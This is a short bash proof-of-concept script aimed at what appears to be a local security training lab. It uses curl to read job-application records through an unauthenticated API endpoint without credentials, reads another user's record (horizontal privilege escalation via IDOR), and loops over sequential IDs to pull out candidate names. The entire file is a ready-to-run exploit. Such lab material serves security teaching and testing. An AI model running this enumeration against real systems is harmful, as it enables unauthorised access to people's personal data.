#!/usr/bin/env bash
# cURL Proof of Concept: Unauthenticated IDOR Parameter Extraction
# Target: Datheon AppSec Lab (http://localhost:5000)

echo "=========================================================="
echo " [POC 1] Fetching User A (DT-2026-001) without credentials"
echo "=========================================================="
curl -i -s -X GET "http://localhost:5000/api/v1/applications/DT-2026-001" \
  -H "Accept: application/json"

echo -e "\n\n=========================================================="
echo " [POC 2] Horizontal Privilege Escalation to User B (DT-2026-002)"
echo "=========================================================="
curl -i -s -X GET "http://localhost:5000/api/v1/applications/DT-2026-002" \
  -H "Accept: application/json"

echo -e "\n\n=========================================================="
echo " [POC 3] Batch Parameter Fuzzing across sequential IDs"
echo "=========================================================="
for id in DT-2026-001 DT-2026-002 DT-2026-003 DT-2026-004; do
  echo ">>> Testing ID: $id"
  curl -s -X GET "http://localhost:5000/api/v1/applications/$id" | grep -o '"candidateName":"[^"]*"'
done
